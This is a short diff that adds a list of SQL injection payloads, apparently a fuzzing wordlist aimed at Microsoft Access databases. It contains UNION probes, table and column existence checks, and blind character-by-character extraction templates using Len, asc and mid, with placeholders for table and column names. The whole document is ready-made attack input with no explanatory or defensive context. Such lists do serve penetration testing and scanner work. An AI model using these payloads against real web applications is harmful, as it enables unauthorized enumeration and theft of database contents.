@@ -1,0 +1,9 @@
+ union select 1 from random.randomtable
+ and 0=(select count(*) from N:\.a)%00
+ and 0<=(select count(*) from [admin]) and 1=1
+ and 0<=(select count(*) from [<InsertTableName>]) and 1=1
+ and 0<=(select count([<ColumnName>]) from [<KnownTableName>]) and 1=1
+ and Len((select Count(*) from [TableName]))=<insert-numerical-value>
+ and Len((select top 1 [ColumnName] from (select top 1 * from (select top 1 * from [TableName] order by 1) t order by 1 desc)t))=<insert-number-value>
+ and asc(mid((select top 1 [ColumnName] from (select top 1 * from (select top 1 * from [TableName] order by 1) t order by 1 desc)t),N,1))=<insert-char-value-here>
+ 
